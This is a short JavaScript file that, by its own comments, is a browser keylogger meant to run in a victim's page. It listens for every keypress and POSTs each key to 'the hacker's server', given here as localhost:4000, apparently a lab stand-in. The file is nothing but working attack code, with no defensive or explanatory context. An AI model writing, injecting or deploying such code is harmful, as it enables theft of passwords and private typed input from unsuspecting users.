// this script registers an event listener in the victims browser
// the callback sends each pressed key to the hacker's server

window.addEventListener('keypress', function(evt) {
    const key = String.fromCharCode(evt.charCode);

    const http = new XMLHttpRequest();
    http.open('POST', 'http://localhost:4000', true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.send(`key=${key}`);
});
